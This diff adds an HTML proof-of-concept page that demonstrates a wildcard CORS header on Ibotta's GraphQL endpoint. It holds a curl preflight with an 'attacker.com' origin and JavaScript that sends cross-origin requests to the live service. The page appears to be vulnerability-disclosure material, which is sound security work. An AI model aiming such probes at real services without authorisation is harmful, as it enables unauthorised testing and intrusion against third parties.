@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>PoC: CORS Wildcard - content-server.ibotta.com/graphql</title>
+<style>
+body { font-family: monospace; background: #1a1a2e; color: #00ff88; padding: 20px; }
+h1 { color: #ff6b6b; }
+pre { background: #0d0d1a; padding: 15px; border-left: 3px solid #00ff88; overflow-x: auto; }
+button { background: #ff6b6b; color: white; border: none; padding: 10px 20px; cursor: pointer; margin: 5px; border-radius: 4px; }
+#result { margin-top: 20px; white-space: pre-wrap; background: #0d0d1a; padding: 15px; border-left: 3px solid #ff6b6b; }
+</style>
+</head>
+<body>
+<h1>CORS Wildcard PoC - Ibotta GraphQL (content-server.ibotta.com)</h1>
+<p><strong>Issue:</strong> Access-Control-Allow-Origin: * on authenticated GraphQL endpoint</p>
+<p><strong>Target:</strong> https://content-server.ibotta.com/graphql</p>
+
+<button onclick="testCORS()">Test CORS (No Auth)</button>
+<button onclick="testPreflight()">Test Preflight OPTIONS</button>
+
+<div id="result">Click a button to run test...</div>
+
+<h2>curl PoC</h2>
+<pre>
+# OPTIONS preflight - shows wildcard CORS
+curl -v -X OPTIONS https://content-server.ibotta.com/graphql \
+  -H 'Origin: https://attacker.com' \
+  -H 'Access-Control-Request-Method: POST' \
+  -H 'Access-Control-Request-Headers: Authorization,Content-Type'
+
+# Response confirms wildcard:
+# < HTTP/2 204
+# < access-control-allow-origin: *
+# < access-control-allow-methods: GET,HEAD,PUT,PATCH,POST,DELETE
+# < access-control-allow-headers: Authorization,Content-Type
+</pre>
+
+<script>
+async function testCORS() {
+    const out = document.getElementById('result');
+    out.textContent = 'Sending cross-origin POST from: ' + window.location.origin + '\n';
+    try {
+        const r = await fetch('https://content-server.ibotta.com/graphql', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ query: '{ __typename }' })
+        });
+        const d = await r.json();
+        out.textContent = '[HTTP ' + r.status + '] Cross-origin request SUCCEEDED\n' +
+            'ACAO header: ' + r.headers.get('access-control-allow-origin') + '\n\n' +
+            JSON.stringify(d, null, 2);
+    } catch(e) {
+        out.textContent = 'Error: ' + e;
+    }
+}
+
+async function testPreflight() {
+    const out = document.getElementById('result');
+    out.textContent = 'Sending OPTIONS preflight...\n';
+    try {
+        const r = await fetch('https://content-server.ibotta.com/graphql', {
+            method: 'OPTIONS',
+            headers: {
+                'Access-Control-Request-Method': 'POST',
+                'Access-Control-Request-Headers': 'Authorization,Content-Type'
+            }
+        });
+        out.textContent = 'Preflight HTTP: ' + r.status + '\n' +
+            'Access-Control-Allow-Origin: ' + r.headers.get('access-control-allow-origin') + '\n' +
+            'Access-Control-Allow-Methods: ' + r.headers.get('access-control-allow-methods') + '\n' +
+            'Access-Control-Allow-Headers: ' + r.headers.get('access-control-allow-headers') + '\n\n' +
+            'VULNERABILITY: Any origin can make authenticated API calls!';
+    } catch(e) {
+        out.textContent = 'Error: ' + e;
+    }
+}
+</script>
+</body>
+</html>
